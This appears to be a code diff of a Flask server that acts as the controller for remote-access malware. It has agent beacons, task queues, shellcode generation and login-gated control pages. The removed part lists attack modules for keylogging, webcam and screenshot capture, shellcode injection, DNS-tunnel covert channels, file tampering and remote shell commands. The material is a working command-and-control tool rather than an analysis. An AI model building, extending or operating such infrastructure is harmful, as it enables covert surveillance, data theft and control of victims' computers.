@@ -88,8 +88,14 @@ def index():
     return render_template('index.html')
 
 @app.route('/shellcode')
+@login_required
 def shellcode():
     return render_template('shellcode.html')
+
+@app.route('/control')
+@login_required
+def control():
+    return render_template('control.html')
 
 @app.route('/api/generate_shellcode', methods=['POST'])
 def generate_shellcode():
@@ -213,6 +219,7 @@ def agent_beacon():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/tasks', methods=['POST'])
+@login_required
 def create_task():
     try:
         data = request.get_json()
@@ -226,6 +233,7 @@ def create_task():
                 'message': 'Missing required fields'
             }), 400
 
+        # Create task
         task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         task = {
             'id': task_id,
@@ -235,11 +243,12 @@ def create_task():
             'timestamp': datetime.now().isoformat()
         }
 
+        # Add task to queue
         if agent_id not in tasks:
             tasks[agent_id] = []
         tasks[agent_id].append(task)
 
-        logging.info(f"Created task {task_id} for agent {agent_id}: {module}")
+        logging.info(f"Task {task_id} created for agent {agent_id}: {module}")
         return jsonify({
             'status': 'success',
             'task_id': task_id
@@ -336,126 +345,6 @@ def receive_result():
 
     except Exception as e:
         logging.error(f"Error processing result: {str(e)}")
-        return jsonify({
-            'status': 'error',
-            'message': str(e)
-        }), 500
-
-@app.route('/control')
-@login_required
-def control_panel():
-    return render_template('control.html')
-
-@app.route('/modules')
-@login_required
-def module_manager():
-    modules = {
-        'system': {
-            'name': 'System Information',
-            'description': 'System information gathering module',
-            'functions': ['get_info']
-        },
-        'process': {
-            'name': 'Process Management',
-            'description': 'Process listing and control',
-            'functions': ['list_processes', 'kill_process']
-        },
-        'surveillance': {
-            'name': 'Surveillance',
-            'description': 'Screenshot, webcam, and keylogging capabilities',
-            'functions': ['take_screenshot', 'capture_webcam', 'start_keylogger', 'stop_keylogger']
-        },
-        'files': {
-            'name': 'File Operations',
-            'description': 'File system operations',
-            'functions': ['list_directory', 'get_file_info', 'read_file', 'write_file', 'delete_file']
-        },
-        'shellcode': {
-            'name': 'Shellcode',
-            'description': 'Shellcode generation and injection',
-            'functions': ['generate', 'inject']
-        },
-        'dns_tunnel': {
-            'name': 'DNS Tunneling',
-            'description': 'Covert communication channel',
-            'functions': ['start', 'stop']
-        },
-        'shell': {
-            'name': 'Shell',
-            'description': 'Command execution',
-            'functions': ['execute']
-        }
-    }
-    return render_template('modules.html', modules=modules)
-
-@app.route('/api/modules/list', methods=['GET'])
-@login_required
-def list_modules():
-    """Get list of available modules and their capabilities"""
-    try:
-        modules = {
-            'system': ['get_info'],
-            'process': ['list_processes', 'kill_process'],
-            'surveillance': ['take_screenshot', 'capture_webcam', 'start_keylogger', 'stop_keylogger'],
-            'files': ['list_directory', 'get_file_info', 'read_file', 'write_file', 'delete_file'],
-            'shellcode': ['generate', 'inject'],
-            'dns_tunnel': ['start', 'stop'],
-            'shell': ['execute']
-        }
-        return jsonify({
-            'status': 'success',
-            'modules': modules
-        })
-    except Exception as e:
-        return jsonify({
-            'status': 'error',
-            'message': str(e)
-        }), 500
-
-@app.route('/send_task', methods=['POST'])
-@login_required
-def send_task_from_ui():
-    """Handle task creation from the web interface"""
-    try:
-        agent_id = request.form.get('agent_id')
-        module = request.form.get('module')
-        params = request.form.get('params', '{}')
-
-        if not agent_id or not module:
-            return jsonify({
-                'status': 'error',
-                'message': 'Missing required fields'
-            }), 400
-
-        # Parse parameters
-        try:
-            params = json.loads(params)
-        except json.JSONDecodeError:
-            params = {}
-
-        # Create task
-        task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        task = {
-            'id': task_id,
-            'module': module,
-            'params': params,
-            'status': 'pending',
-            'timestamp': datetime.now().isoformat()
-        }
-
-        # Add task to queue
-        if agent_id not in tasks:
-            tasks[agent_id] = []
-        tasks[agent_id].append(task)
-
-        logging.info(f"Task {task_id} created for agent {agent_id}: {module}")
-        return jsonify({
-            'status': 'success',
-            'task_id': task_id
-        })
-
-    except Exception as e:
-        logging.error(f"Error creating task from UI: {str(e)}")
         return jsonify({
             'status': 'error',
             'message': str(e)
